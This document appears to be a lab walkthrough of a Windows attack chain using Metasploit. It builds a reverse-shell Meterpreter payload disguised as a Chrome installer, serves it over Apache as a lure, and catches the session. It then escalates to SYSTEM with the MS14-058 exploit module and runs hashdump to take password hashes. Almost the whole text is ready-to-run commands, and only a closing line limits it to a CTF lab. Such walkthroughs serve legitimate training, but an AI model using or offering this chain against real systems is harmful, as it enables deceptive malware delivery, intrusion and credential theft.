# 💨 Windows Privilege Escalation

> **Attacker IP:** `192.168.1.20`  
> **Platform:** Windows x64  
> **Final Exploit:** MS14-058 (Track Popup Menu — CVE-2014-4113)

---

## Phase 1 — Payload Generation

Create a malicious executable disguised as a Chrome installer using `msfvenom`:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.20 \
  LPORT=8789 \
  --platform windows \
  -f exe \
  -o ~/Desktop/chrome-clone.exe
```

| Option | Value | Purpose |
|--------|-------|---------|
| `-p` | `windows/x64/meterpreter/reverse_tcp` | Reverse TCP Meterpreter shell |
| `LHOST` | `192.168.1.20` | Attacker machine IP |
| `LPORT` | `8789` | Listening port |
| `-f exe` | — | Output as Windows executable |
| `-o` | `chrome-clone.exe` | Output filename (social engineering lure) |

---

## Phase 2 — Host the Payload via Apache

Serve the payload over HTTP so the target can download and execute it:

```bash
sudo cp /home/kali/Desktop/chrome-clone.exe /var/www/html
sudo rm /var/www/html/index*          # Remove default Apache page
sudo service apache2 start
```

> 🌐 Payload is now available at:  
> `http://192.168.1.20/chrome-clone.exe`

---

## Phase 3 — Set Up the Listener (Metasploit)

```bash
msfconsole -q
```

```msf
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.20
set LPORT 8789
exploit -j          # Run as background job
jobs                # Confirm listener is active
```

> ⏳ **Wait** for the target to download and execute `chrome-clone.exe`.

---

## Phase 4 — Catch the Session

Once the target runs the `.exe`, a Meterpreter session opens:

```msf
sessions 1          # Interact with session 1
bg                  # Background the session
```

---

## Phase 5 — Post Exploitation: Local Privilege Escalation Suggestions

Run the local exploit suggester to identify privilege escalation vectors:

```msf
search suggester
use 0               # post/multi/recon/local_exploit_suggester
show options
set SESSION 1
run
```

> 📋 Review the output — look for **MS14-058** in the suggested exploits list.

---

## Phase 6 — Privilege Escalation (MS14-058)

**CVE-2014-4113** — Win32k.sys TrackPopupMenu vulnerability.  
Affects unpatched Windows systems and allows **SYSTEM-level** code execution.

```msf
use exploit/windows/local/ms14_058_track_popup_menu
set payload windows/x64/meterpreter/reverse_tcp
show options
set SESSION 1
set LPORT 5643
show targets
set target 1        # Windows x64
exploit
```

> 🎉 If successful, a new Meterpreter session opens with **NT AUTHORITY\SYSTEM** privileges.

### Verify Privilege Escalation
```msf
getuid
# Server username: NT AUTHORITY\SYSTEM
getsystem
hashdump
```

---

## Summary

| Phase | Action | Tool / Module |
|-------|--------|---------------|
| 1 | Generate reverse shell payload | `msfvenom` |
| 2 | Host payload via web server | `apache2` |
| 3 | Set up multi/handler listener | `msfconsole` |
| 4 | Catch Meterpreter session | `sessions` |
| 5 | Identify privesc vectors | `local_exploit_suggester` |
| 6 | Escalate to SYSTEM | `ms14_058_track_popup_menu` |

---

## Key CVEs & References

| CVE | Name | Impact |
|-----|------|--------|
| CVE-2014-4113 | MS14-058 TrackPopupMenu | Local privilege escalation → SYSTEM |

- [MS14-058 Microsoft Advisory](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-058)
- [Rapid7 Module Docs](https://www.rapid7.com/db/modules/exploit/windows/local/ms14_058_track_popup_menu/)

---

> ⚠️ **Disclaimer:** This walkthrough is strictly for educational use in a legal, isolated CTF lab environment. Never use these techniques against systems you do not have explicit permission to test.
